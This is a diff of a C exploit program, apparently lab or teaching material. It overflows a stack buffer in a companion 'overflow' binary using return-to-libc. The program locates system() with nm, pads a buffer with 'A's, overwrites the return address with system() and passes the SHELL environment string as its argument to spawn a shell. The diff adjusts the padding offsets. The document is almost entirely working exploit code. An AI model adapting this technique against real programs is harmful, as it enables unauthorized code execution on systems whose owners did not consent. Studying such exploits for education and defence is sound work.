@@ -39,17 +39,19 @@ int main(int argc, char ** argv)
     char * system_fn_as_str;
     size_t * system_fn = (size_t *)0xDEADC0DE;
     char cmd_get_system_fn[BUFSIZ];
-    char path_to_overflow[BUFSIZ];
-    char exploit_buffer[BUFLEN + 4 /* first argument of function overflow() in overflow.c */
-                               + 4 /* return address -> address of system() */
+    char path[BUFSIZ];
+    char exploit_buffer[BUFLEN + 8 /* other/padding */
                                + 4 /* saved ebp (stack frame of the calling fn) */
-                               + 4 /* first argument for system() */];
+                               + 4 /* return address to main() -> address of system() */
+                               + 4
+                               + 4 /* first argument for overflow() -> first argument of system() */];
 
     if (argc != 1)
     {
         exit(1);
     }
     mydir = dirname(strdup(argv[0]));
+    chdir(mydir);
 
     snprintf(cmd_get_system_fn, sizeof(cmd_get_system_fn),
              "nm %s/overflow | grep 'W system' | cut -d ' ' -f 1", mydir);
@@ -62,23 +64,22 @@ int main(int argc, char ** argv)
     }
     system_fn = (size_t *)strtoul(system_fn_as_str, NULL, 16);
 
-    snprintf(path_to_overflow, sizeof(path_to_overflow), "%s/%s",
-             mydir, "overflow");
-    printf("Exec......: %s\n"
-           "system()..: %p\n"
-           "env(SHELL): %p\n",
-           path_to_overflow, system_fn, getenv("SHELL"));
-
     memset(exploit_buffer, 'A', sizeof(exploit_buffer));
-    *(size_t **)&exploit_buffer[BUFLEN + 4] = system_fn;
-    *(size_t **)&exploit_buffer[BUFLEN + 4 + 4 + 4] = (size_t *)(getenv("SHELL") + strlen("SHELL"));
+    *(size_t **)&exploit_buffer[BUFLEN + 8 + 4] = system_fn;
+    *(size_t **)&exploit_buffer[BUFLEN + 8 + 4 + 4 + 4] = (size_t *)(getenv("SHELL") + strlen("SHELL"));
 
     printf("\nexploit buffer:\n");
     hexdump(exploit_buffer, sizeof(exploit_buffer));
     printf("\n\n");
 
+    snprintf(path, sizeof(path), "%s", "./overflow");
+    printf("Exec......: %s\n"
+           "system()..: %p\n"
+           "env(SHELL): %p\n\n",
+           path, system_fn, getenv("SHELL"));
+
     printf("All set up, let's have some fun.\n"
            "Executing %s with exploit buffer as argv[1]\n",
-           path_to_overflow);
-    execl(path_to_overflow, path_to_overflow, exploit_buffer, NULL);
+           path);
+    execl(path, path, exploit_buffer, NULL);
 }
